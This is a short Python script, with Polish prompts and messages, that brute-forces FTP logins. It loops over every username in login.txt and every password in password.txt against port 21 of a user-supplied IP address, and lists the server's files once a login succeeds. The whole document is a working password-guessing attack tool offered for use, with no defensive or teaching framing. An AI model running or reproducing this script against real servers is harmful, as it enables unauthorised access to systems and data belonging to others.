import ftplib

target = input("podaj IP: ")

server = ftplib.FTP()
logins = open("login.txt","r")
passwords = open("password.txt","r")

for login in logins.read().splitlines():
    passwords.seek(0)
    for password in passwords.read().splitlines():
        try:
            print(login, password)
            server.connect(target, 21, timeout=1)
            server.login(login, password)
            print("zalogowalem sie")
        except Exception as e:
            pass
        else:
            print("po loginie: ",login, password)
            server.dir()
            input("wcisnij enter ")
        finally:
            print("to jest zawsze uruchamiane")
